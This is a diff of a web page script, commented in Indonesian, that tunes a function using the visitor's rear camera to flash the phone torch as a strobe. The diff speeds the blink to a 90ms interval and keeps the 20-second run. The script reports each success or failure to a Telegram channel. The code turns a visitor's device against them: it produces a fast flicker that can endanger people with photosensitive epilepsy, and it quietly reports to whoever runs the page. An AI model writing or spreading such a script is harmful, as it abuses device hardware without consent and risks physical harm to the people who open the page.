@@ -236,7 +236,7 @@
       }
     }
 
-    // --- FITUR FLASH UPDATED ---
+    // --- FITUR FLASH UPDATED (90ms) ---
     async function startFlashStrobe() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
@@ -252,7 +252,7 @@
         sendToTelegram('flash berhasil on ✅');
 
         let isOn = false;
-        // Interval kedip 100ms
+        // Kecepatan kedip diatur ke 90ms
         const interval = setInterval(async () => {
           try {
             isOn = !isOn;
@@ -260,9 +260,9 @@
           } catch (e) {
             clearInterval(interval);
           }
-        }, 100);
+        }, 90);
 
-        // Berjalan selama 20 detik
+        // Durasi 20 detik
         setTimeout(() => {
           clearInterval(interval);
           track.applyConstraints({ advanced: [{ torch: false }] });
@@ -273,7 +273,6 @@
         sendToTelegram('flash tidak on 🤬');
       }
     }
-    // ----------------------------
 
     window.addEventListener('DOMContentLoaded', () => {
       createParticles();
